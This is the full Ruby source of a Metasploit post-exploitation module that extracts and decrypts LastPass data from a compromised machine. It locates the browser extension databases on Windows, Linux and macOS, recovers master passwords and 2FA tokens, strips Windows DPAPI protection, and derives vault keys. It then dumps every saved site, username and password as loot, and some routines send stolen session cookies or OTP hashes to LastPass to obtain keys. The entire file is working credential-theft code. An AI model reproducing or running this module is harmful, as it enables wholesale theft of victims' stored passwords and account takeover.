require 'msf/core'
require 'base64'
require 'sqlite3'
require 'uri'

class Metasploit3 < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::OSX::System
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LastPass Vault Decryptor',
        'Description' => 'This module extracts and decrypts LastPass master login accounts and passwords, encryption keys, 2FA tokens and all the vault passwords',
        'License' => MSF_LICENSE,
        'Author' => [
          'Alberto Garcia Illera <agarciaillera[at]gmail.com>', # original module and research
          'Martin Vigo <martinvigo[at]gmail.com>', # original module and research
          'Jon Hart <jon_hart[at]rapid7.com' # module rework and cleanup
        ],
        'Platform' => %w(linux osx unix win),
        'References'   => [['URL', 'http://www.martinvigo.com/a-look-into-lastpass/']],
        'SessionTypes' => %w(meterpreter shell)
      )
    )
  end

  def run
    if session.platform =~ /win/ && session.type == "shell" # No Windows shell support
      print_error "Shell sessions on Windows are not supported"
      return
    end

    print_status "Searching for LastPass databases"

    account_map = build_account_map
    if account_map.empty?
      print_status "No databases found"
      return
    end

    print_status "Extracting credentials"
    extract_credentials(account_map)

    print_status "Extracting 2FA tokens"
    extract_2fa_tokens(account_map)

    print_status "Extracting vault and iterations"                           
    extract_vault_and_iterations(account_map)

    print_status "Extracting encryption keys"
    extract_vault_keys(account_map)

    print_lastpass_data(account_map)
  end


  # Returns a mapping of lastpass accounts
  def build_account_map
    platform = session.platform
    profiles = user_profiles
    account_map = {}

    profiles.each do |user_profile|
      account = user_profile['UserName']
      browser_path_map = {}
      localstorage_path_map = {}

      case platform
      when /win/
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles",
          'IE' => "HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\LastPass",
          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
          'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
        }
        localstorage_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Local Storage\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
          'Firefox' => "#{user_profile['LocalAppData']}Low\\LastPass",
          'IE' => "#{user_profile['LocalAppData']}Low\\LastPass",
          'Opera' => "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\Local Storage\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
          'Safari' => "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\LocalStorage\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
        }
        cookies_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\Cookies",
          'Firefox' => "",
          'Opera' => "",
          'Safari' => ""
        }
      when /unix|linux/
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['LocalAppData']}/.mozilla/firefox",
          'Opera' => "#{user_profile['LocalAppData']}/.config/Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
        }
        localstorage_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/.config/google-chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
          'Firefox' => "#{user_profile['LocalAppData']}/.lastpass",
          'Opera' => "#{user_profile['LocalAppData']}/.config/Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage"
        }
        cookies_path_map = { #TODO
          'Chrome' => "",
          'Firefox' => "",
          'Opera' => "",
          'Safari' => ""
        }
      when /osx/
        browser_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0",
          'Firefox' => "#{user_profile['LocalAppData']}/Firefox/Profiles",
          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0",
          'Safari' => "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
        }
        localstorage_path_map = {
          'Chrome' => "#{user_profile['LocalAppData']}/Google/Chrome/Default/Local Storage/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0.localstorage",
          'Firefox' => "#{user_profile['AppData']}/Containers/com.lastpass.LastPass/Data/Library/Application Support/LastPass",
          'Opera' => "#{user_profile['LocalAppData']}/com.operasoftware.Opera/Local Storage/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0.localstorage",
          'Safari' => "#{user_profile['AppData']}/Safari/LocalStorage/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0.localstorage"
        }
        cookies_path_map = { #TODO
          'Chrome' => "",
          'Firefox' => "",
          'Opera' => "",
          'Safari' => ""
        }
      else
        print_error "Platform not recognized: #{platform}"
      end

      account_map[account] = {}
      browser_path_map.each_pair do |browser, path|
        account_map[account][browser] = {}
        db_paths = find_db_paths(path, browser, account)
        if db_paths && db_paths.size > 0
          account_map[account][browser]['lp_db_path'] = db_paths
          if session.type == "meterpreter"
            account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if client.fs.file.exists?(localstorage_path_map[browser]) || browser.match(/Firefox|IE/)
            account_map[account][browser]['cookies_db'] = cookies_path_map[browser] if client.fs.file.exists?(cookies_path_map[browser]) || browser.match(/Firefox|IE/)
            #account_map[account][browser]['cookies_db'] = cookies_path_map[browser]['lp_db_path'].gsub("prefs.js", "cookies.sqlite") if client.fs.file.exists?(cookies_path_map[browser]['lp_db_path']) && browser == 'Firefox'
          else # session.type == "shell"
            account_map[account][browser]['localstorage_db'] = localstorage_path_map[browser] if session.shell_command("ls \"#{localstorage_path_map[browser]}\"").strip == localstorage_path_map[browser].strip || browser.match(/Firefox|IE/)
            account_map[account][browser]['cookies_db'] = cookies_path_map[browser] if session.shell_command("ls \"#{cookies_path_map[browser]}\"").strip == cookies_path_map[browser].strip || browser.match(/Firefox|IE/)
            #account_map[account][browser]['cookies_db'] = cookies_path_map[browser]['lp_db_path'] if session.shell_command("ls \"#{cookies_path_map[browser]['lp_db_path']}\"").strip == cookies_path_map[browser]['lp_db_path'].strip && browser == 'Firefox'
          end
        else
          account_map[account].delete(browser)
        end
      end
    end

    account_map
  end

  # Returns a list of DB paths found in the victims' machine
  def find_db_paths(path, browser, account)
    paths = []

    vprint_status "Checking #{account}'s #{browser}"
    if browser == "IE" # Special case for IE
      ## Check the Registry to see if there are any accounts. if not return empty array "paths"
    elsif browser == "Firefox" # Special case for Firefox
      profiles = firefox_profile_files(path, browser)
      paths |= profiles
    else
      paths |= file_paths(path, browser, account)
    end

    vprint_good "Found #{paths.size} #{browser} databases for #{account}"
    paths
  end

  # Returns the relevant information from user profiles
  def user_profiles
    user_profiles = []
    case session.platform
    when /unix|linux/
      if session.type == "meterpreter"
        user_names = client.fs.dir.entries("/home")
      else
        user_names = session.shell_command("ls /home").split
      end
      user_names.reject! { |u| %w(. ..).include?(u) }
      user_names.each do |user_name|
        user_profiles.push('UserName' => user_name, "LocalAppData" => "/home/#{user_name}")
      end
    when /osx/
      user_names = session.shell_command("ls /Users").split
      user_names.reject! { |u| u == 'Shared' }
      user_names.each do |user_name|
        user_profiles.push(
          'UserName' => user_name,
          "AppData" => "/Users/#{user_name}/Library",
          "LocalAppData" => "/Users/#{user_name}/Library/Application Support"
        )
      end
    when /win/
      user_profiles |= grab_user_profiles
    else
      print_error "OS not recognized: #{os}"
    end
    user_profiles
  end

  # Extracts the databases paths from the given folder ignoring . and ..
  def file_paths(path, browser, account)
    found_dbs_paths = []

    files = []
    if directory?(path)
      sep = session.platform =~ /win/ ? '\\' : '/'
      if session.type == "meterpreter"
        files = client.fs.dir.entries(path)
      elsif session.type == "shell"
        files = session.shell_command("ls \"#{path}\"").split
      else
        print_error "Session type not recognized: #{session.type}"
        return found_dbs_paths
      end
    end
    files.each do |file_path|
      unless %w(. .. Shared).include?(file_path)
        found_dbs_paths.push([path, file_path].join(sep))
      end
    end

    found_dbs_paths
  end

  # Returns the profile files for Firefox
  def firefox_profile_files(path, browser)
    found_dbs_paths = []

    if directory?(path)
      sep = session.platform =~ /win/ ? '\\' : '/'
      if session.type == "meterpreter"
        files = client.fs.dir.entries(path)
      elsif session.type == "shell"
        files = session.shell_command("ls \"#{path}\"").split
      else
        print_error "Session type not recognized: #{session.type}"
        return found_dbs_paths
      end

      files.reject! { |file| %w(. ..).include?(file) }
      files.each do |file_path|
        found_dbs_paths.push([path, file_path, 'prefs.js'].join(sep)) if file_path.match(/.*\.default/)
      end
    end

    found_dbs_paths
  end

  # Parses the Firefox preferences file and returns encoded credentials
  def firefox_credentials(prefs_path, localstorage_db_path)
    credentials = []
    File.readlines(prefs_path).each do |line|
      if /user_pref\("extensions.lastpass.loginusers", "(?<encoded_users>.*)"\);/ =~ line
        usernames = encoded_users.split("|")
        usernames.each do |username|
          credentials << [username, nil]
        end
        break
      end
    end

    # Extract master passwords
    path = localstorage_db_path + client.fs.file.separator + "lp.loginpws"
    begin
      data = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
    rescue EOFError
      vprint_error "File #{path} is empty"
      data = nil
    end
    data = windows_unprotect(data) if data != nil && data.match(/^AQAAA.+/) # Verify Windows protection
    return credentials if data.blank? # No passwords stored
    creds_per_user = data.split("|")
    creds_per_user.each_with_index do |user_creds, index|
      parts = user_creds.split('=')
      for creds in credentials
          creds[1] = parts[1] if creds[0] == parts[0] # Add the password to the existing username
      end
    end
    credentials
  end

  def decrypt_data(key, encrypted_data)
    return nil if encrypted_data.blank?

    if encrypted_data.include?("|") # Use CBC
      decipher = OpenSSL::Cipher.new("AES-256-CBC")
      decipher.iv = Base64.decode64(encrypted_data[1, 24]) # Discard ! and |
      encrypted_data = encrypted_data[26..-1] #Take only the data part
    else # Use ECB
      decipher = OpenSSL::Cipher.new("AES-256-ECB")
    end

    begin
      decipher.decrypt
      decipher.key = key
      decrypted_data = decipher.update(Base64.decode64(encrypted_data)) + decipher.final
    rescue
      vprint_error "Data could not be decrypted"
    end

    decrypted_data
  end

  def extract_credentials(account_map)
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, paths|
        account_map[account][browser]['lp_creds'] = {}
        if browser == 'Firefox'
          paths['lp_db_path'].each do |path|
            loot_path = loot_file(path, nil, 'firefox.preferences', "text/javascript", "Firefox preferences file #{path}")
            ffcreds = firefox_credentials(loot_path, paths['localstorage_db'] ) # Extract usernames and passwords from preference file
            unless ffcreds.blank?
              ffcreds.each do |creds|
                if creds[1].blank? # No master password found
                  account_map[account][browser]['lp_creds'][URI.unescape(creds[0])] = {'lp_password' => nil} 
                else
                  sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(URI.unescape(creds[0]))
                  sha256_binary_email = [sha256_hex_email].pack "H*" # Do hex2bin
                  creds[1] = decrypt_data(sha256_binary_email, URI.unescape(creds[1]))
                  account_map[account][browser]['lp_creds'][URI.unescape(creds[0])] = {'lp_password' => creds[1]}
                end
              end
            end

          end
        else # Chrome, Safari and Opera
          paths['lp_db_path'].each do |path|
            loot_path = loot_file(path, nil, "#{browser.downcase}.lastpass.database", "application/x-sqlite3", "#{account}'s #{browser} LastPass database #{path}")
            account_map[account][browser]['lp_db_loot'] = loot_path

            # Parsing/Querying the DB
            db = SQLite3::Database.new(loot_path)
            result = db.execute(
              "SELECT username, password FROM LastPassSavedLogins2 " \
              "WHERE username IS NOT NULL AND username != '' " \
            )

            for row in result
              if row[0]
                sha256_hex_email = OpenSSL::Digest::SHA256.hexdigest(row[0])
                sha256_binary_email = [sha256_hex_email].pack "H*" # Do hex2bin
                row[1].blank? ? row[1] = nil : row[1] = decrypt_data(sha256_binary_email, row[1]) # Decrypt master password
                account_map[account][browser]['lp_creds'][row[0]] = {'lp_password' => row[1]}
              end
            end
          end
        end
      end
    end
  end

  #Extracts the 2FA token from localStorage
  def extract_2fa_tokens(account_map)
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        if browser == 'Firefox'
          path = lp_data['localstorage_db'] + client.fs.file.separator + "lp.suid"
          data = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
          data = windows_unprotect(data) if data != nil && data.size > 32 # Verify Windows protection
          loot_path = loot_file(nil, data, "#{browser.downcase}.lastpass.localstorage", "application/x-sqlite3", "#{account}'s #{browser} LastPass localstorage #{lp_data['localstorage_db']}")
          account_map[account][browser]['lp_2fa'] = data          
        else # Chrome, Safari and Opera
          loot_path = loot_file(lp_data['localstorage_db'], nil, "#{browser.downcase}.lastpass.localstorage", "application/x-sqlite3", "#{account}'s #{browser} LastPass localstorage #{lp_data['localstorage_db']}")  
          db = SQLite3::Database.new(loot_path)
          token = db.execute(
            "SELECT hex(value) FROM ItemTable " \
            "WHERE key = 'lp.uid';"
          ).flatten

          token.blank? ? account_map[account][browser]['lp_2fa'] = nil : account_map[account][browser]['lp_2fa'] = token.pack('H*')
        end
      end
    end
  end

  #Print all extracted LastPass data
  def print_lastpass_data(account_map)
    lastpass_data_table = Rex::Ui::Text::Table.new(
      'Header' => "LastPass Accounts",
      'Indent' => 1,
      'Columns' => %w(Account Browser LP_Username LP_Password LP_2FA LP_Key)
    )

    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        lp_data['lp_creds'].each_pair do |username, user_data|
          lastpass_data_table << [account, browser, username, user_data['lp_password'], lp_data['lp_2fa'], user_data['vault_key']]
        end
      end
    end

    unless account_map.empty?
      print_good lastpass_data_table.to_s
      loot_file(nil, lastpass_data_table.to_csv, "lastpass.data", "text/csv", "LastPass Data")  
      print_vault_passwords(account_map)
    end
  end

  def extract_vault_and_iterations(account_map)
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        lp_data['lp_creds'].each_pair do |username, user_data|
          if browser.match(/Firefox|IE/)
            if browser == "Firefox"
              iterations_path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_key.itr"
            else # IE
              iterations_path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_key_ie.itr"
            end
            iterations = read_file(iterations_path) if client.fs.file.exists?(iterations_path) # Read file if it exists
            iterations = nil if iterations.blank? # Verify content
            lp_data['lp_creds'][username]['iterations'] = iterations

            # Find encrypted vault
            vault_path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lps.act.sxml"
            vault_path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_lps.sxml" if !client.fs.file.exists?(vault_path)
            vault = read_file(vault_path)
            vault = windows_unprotect(vault) if vault != nil && vault.match(/^AQAAA.+/) # Verify Windows protection
            vault = vault.sub(/iterations=.*;/, "") if client.fs.file.exists?(vault_path) # Remove iterations info
            loot_path = loot_file(nil, vault, "#{browser.downcase}.lastpass.vault", "text/plain", "#{account}'s #{browser} LastPass vault")
            lp_data['lp_creds'][username]['vault_loot'] = loot_path

          else # Chrome, Safari and Opera
            db = SQLite3::Database.new(lp_data['lp_db_loot'])
            result = db.execute(
              "SELECT data FROM LastPassData " \
              "WHERE username_hash = '" + OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type = 'accts'"
            )

            if result.size == 1 && !result[0].blank?
              if  /iterations=(?<iterations>.*);(?<vault>.*)/ =~ result[0][0]
                lp_data['lp_creds'][username]['iterations'] = iterations
              else
                lp_data['lp_creds'][username]['iterations'] = 1
              end
              loot_path = loot_file(nil, vault, "#{browser.downcase}.lastpass.vault", "text/plain", "#{account}'s #{browser} LastPass vault") 
              lp_data['lp_creds'][username]['vault_loot'] = loot_path
            else
              lp_data['lp_creds'][username]['iterations'] = nil
              lp_data['lp_creds'][username]['vault_loot'] = nil
            end
          end
        end
      end
    end
  end

  def extract_vault_keys(account_map)
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        browser_checked = false # Track if local stored vault key was already decrypted for this browser (only one session cookie)
        lp_data['lp_creds'].each_pair do |username, user_data|
          if !user_data['lp_password'].blank? && user_data['iterations'] != nil # Derive vault key from credentials
            lp_data['lp_creds'][username]['vault_key'] = derive_vault_key_from_creds(username, lp_data['lp_creds'][username]['lp_password'], user_data['iterations'])
          else # Get vault key decrypting the locally stored one or from the disabled OTP
            if !browser_checked
              #decrypt_local_vault_key(account, browser_map) 
              browser_checked = true
            end
            if lp_data['lp_creds'][username]['vault_key'] == nil # If no vault key was found yet, try with dOTP
              ##otpbin = extract_otpbin(account, browser, username, lp_data)
              ##lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key_with_otp(username, otpbin)
            end
          end
        end
      end
    end
  end

  # Decrypt the locally stored vault key
  def decrypt_local_vault_key account, browser_map
      browser_map.each_pair do |browser, lp_data|
        case browser
        when /Chrome/
          query = "SELECT encrypted_value FROM cookies WHERE host_key = 'lastpass.com' AND name = 'PHPSESSID'"
        when "Opera"
          query = ""
        when "Firefox"
          query = "SELECT value FROM moz_cookies WHERE baseDomain = 'lastpass.com' AND name = 'PHPSESSID'"
        when "Safari"
          query = ""
        else
          query = nil
          print_error "Browser #{browser} not recognized"
        end

        data = read_file(lp_data['cookies_db'])
        loot_path = store_loot(
          "#{browser.downcase}.lastpass.cookies",
          'application/x-sqlite3',
          session,
          data,
          nil,
          "#{account}'s #{browser} cookies DB"
        )
        # Parsing/Querying the DB
        db = SQLite3::Database.new(loot_path)
        begin
          result = db.execute(query)
        rescue
          vprint_error "No session cookie was found in #{account}'s #{browser}"
          next
        end
        next if result.blank? # No session cookie found for this browser
        session_cookie = windows_unprotect(Base64.encode64(result[0][0])) # TODO: Support other browsers/OSs

        # Use the cookie to obtain the encryption key to decrypt the vault key
        uri = URI('https://lastpass.com/login_check.php')
        request = Net::HTTP::Post.new(uri)
        request.set_form_data("wxsessid" => URI.unescape(session_cookie),"uuid" => browser_map['lp_2fa'])
        request.content_type = 'application/x-www-form-urlencoded; charset=UTF-8'
        response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true) { |http| http.request(request) }

        # Parse response
        next if !response.body.match(/pwdeckey\="([a-z0-9]+)"/) # Session must have expired
        decryption_key = OpenSSL::Digest::SHA256.hexdigest(response.body.match(/pwdeckey\="([a-z0-9]+)"/)[1])
        username = response.body.match(/lpusername="([A-Za-z0-9._%+-@]+)"/)[1]

        # Get the local encrypted vault key
        db = SQLite3::Database.new(lp_data['lp_db_loot'])
        result = db.execute(
          "SELECT data FROM LastPassData " \
          "WHERE username_hash = '"+OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type = 'key'"
        )
        encrypted_vault_key = result[0][0].split("\n")[0]

        # Decrypt the local stored key
        lp_data['lp_creds'][username]['vault_key'] = decrypt_data([decryption_key].pack("H*"), encrypted_vault_key)
      end
  end

  # Returns otp, encrypted_key
  def extract_otpbin(account, browser, username, lp_data)    
    if browser == 'Firefox'
      path = lp_data['localstorage_db'] + client.fs.file.separator + OpenSSL::Digest::SHA256.hexdigest(username) + "_ff.sotp"
      otpbin = read_file(path) if client.fs.file.exists?(path) #Read file if it exists
      otpbin = windows_unprotect(otpbin) if otpbin != nil && otpbin.match(/^AQAAA.+/)
      return otpbin
    else # Chrome, Safari and Opera
      db = SQLite3::Database.new(lp_data['lp_db_loot'])
      result = db.execute(
        "SELECT type, data FROM LastPassData " \
        "WHERE username_hash = '"+OpenSSL::Digest::SHA256.hexdigest(username)+"' AND type = 'otp'"
      )
      [result[0][1]].pack "H*"
    end
  end

  def derive_vault_key_from_creds username, password, key_iteration_count
    if key_iteration_count == 1
        key = Digest::SHA256.hexdigest username + password
    else
        key = pbkdf2(password, username, key_iteration_count.to_i, 32).first
    end
    
    key
  end

  def decrypt_vault_key_with_otp username, otpbin
    vault_key_decryption_key = [lastpass_sha256(username + otpbin)].pack "H*"
    encrypted_vault_key = retrieve_encrypted_vault_key_with_otp(username, otpbin)
    decrypt_data(vault_key_decryption_key, encrypted_vault_key)
  end

  def retrieve_encrypted_vault_key_with_otp username, otpbin
    # Derive login hash from otp
    otp_token = lastpass_sha256( lastpass_sha256( username + otpbin ) + otpbin ) # OTP login hash

    # Make request to LastPass
    uri = URI('https://lastpass.com/otp.php')
    request = Net::HTTP::Post.new(uri)
    request.set_form_data("login" => 1, "xml" => 1, "hash" => otp_token, "otpemail" => URI.escape(username), "outofbandsupported" => 1, "changepw" => otp_token)
    request.content_type = 'application/x-www-form-urlencoded; charset=UTF-8'
    response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true) {|http| http.request(request) }

    # Parse response
    encrypted_vault_key = nil
    if response.body.match(/randkey\="(.*)"/)
      encrypted_vault_key = response.body.match(/randkey\="(.*)"/)[1]
    end

    encrypted_vault_key
  end

  # LastPass does some preprocessing (UTF8) when doing a SHA256 on special chars (binary)
  def lastpass_sha256(input)
    output = ""
    
    input = input.gsub("\r\n", "\n")
    
    input.each_byte do |e|
      if 128 > e
        output += e.chr
      else
        if (127 < e && 2048 > e)
          output += (e >> 6 | 192).chr
          output += (e & 63 | 128).chr
        else
          output += (e >> 12 | 224).chr
          output += (e >> 6 & 63 | 128).chr
        end
      end
    end

    OpenSSL::Digest::SHA256.hexdigest(output)
  end

  def pbkdf2(password, salt, iterations, key_length)
    digest = OpenSSL::Digest::SHA256.new
    OpenSSL::PKCS5.pbkdf2_hmac(password, salt, iterations, key_length, digest).unpack 'H*'
  end

  def windows_unprotect(data)
    data = Base64.decode64(data)
    rg = session.railgun
    pid = session.sys.process.getpid
    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
    mem = process.memory.allocate(data.length+200)
    process.memory.write(mem, data)

    if session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
        addr = [mem].pack("V")
        len = [data.length].pack("V")
        ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
        len, addr = ret["pDataOut"].unpack("V2")
    else
        addr = Rex::Text.pack_int64le(mem)
        len = Rex::Text.pack_int64le(data.length)
        ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
        pData = ret["pDataOut"].unpack("VVVV")
        len = pData[0] + (pData[1] << 32)
        addr = pData[2] + (pData[3] << 32)
    end

    return "" if len == 0
    process.memory.read(addr, len)
  end

  def print_vault_passwords(account_map)
    account_map.each_pair do |account, browser_map|
      browser_map.each_pair do |browser, lp_data|
        lp_data['lp_creds'].each_pair do |username, user_data|
          lastpass_vault_data_table = Rex::Ui::Text::Table.new(
            'Header' => "Decrypted vault from #{username}",
            'Indent' => 1,
            'Columns' => %w(URL Username Password)
          )
          if user_data['vault_loot'] == nil # Was a vault found?
            print_error "No vault was found for #{username}"
            next
          end
          encoded_vault = File.read(user_data['vault_loot'])
          if encoded_vault[0] == "!" # Vault is double encrypted
            encoded_vault = decrypt_data([user_data['vault_key']].pack("H*"), encoded_vault)
            if encoded_vault.blank?
              print_error "Vault from #{username} could not be decrypted"
              next
            else
              encoded_vault = encoded_vault.sub("LPB64", "") 
            end
          end

          # Parse vault
          vault = Base64.decode64(encoded_vault)
          vault.scan(/ACCT/) do |result|
            chunk_length = vault[$~.offset(0)[1]..$~.offset(0)[1]+3].unpack("H*").first.to_i(16) # Get the length in base 10 of the ACCT chunk
            chunk = vault[$~.offset(0)[0]..$~.offset(0)[1]+chunk_length] # Get ACCT chunk
            account_data = parse_vault_account(chunk, user_data['vault_key']) 
            lastpass_vault_data_table << account_data if account_data != nil
          end

          unless account_map.empty? # Loot passwords
            print_good lastpass_vault_data_table.to_s
            path = store_loot(
              "lastpass.#{username}.passwords",
              "text/csv",
              session,
              lastpass_vault_data_table.to_csv,
              nil,
              "LastPass Vault Passwords from #{username}"
            )
          end
        end
      end
    end    
  end

  def parse_vault_account(chunk, vaultKey)
    pointer = 22 # Starting position to find data to decrypt
    labels = ["name", "folder", "url", "notes", "undefined", "undefined2", "username", "password"]
    vault_data = []
    for label in labels
      length = chunk[pointer..pointer+3].unpack("H*").first.to_i(16)
      encrypted_data = chunk[pointer+4..pointer+4+length-1]
      label != "url" ? decrypted_data = decrypt_vault_password(vaultKey, encrypted_data) : decrypted_data = [encrypted_data].pack("H*")
      decrypted_data = "" if decrypted_data == nil
      vault_data << decrypted_data if (label == "url" || label == "username" || label == "password") 
      pointer = pointer + 4 + length
    end
    return vault_data[0] == "http://sn" ? nil : vault_data # TODO: Support secure notes
  end

  def decrypt_vault_password(key, encrypted_data)
    return nil if key.blank? || encrypted_data.blank?

    if encrypted_data[0] == "!" # Apply CBC
      decipher = OpenSSL::Cipher.new("AES-256-CBC")
      decipher.iv = encrypted_data[1, 16] # Discard !
      encrypted_data = encrypted_data[17..-1]
    else # Apply ECB
      decipher = OpenSSL::Cipher.new("AES-256-ECB")
    end
    decipher.decrypt
    decipher.key = [key].pack "H*"

    begin
      return decipher.update(encrypted_data) + decipher.final
    rescue
      vprint_error "Vault password could not be decrypted"
      return nil
    end
  end

  # Reads a remote file and loots it
  def loot_file(path, data, title, type, description)
    data = read_file(path) if data == nil
    loot_path = store_loot(
      title,
      type,
      session,
      data,
      nil,
      description
    )
    return loot_path
  end

end
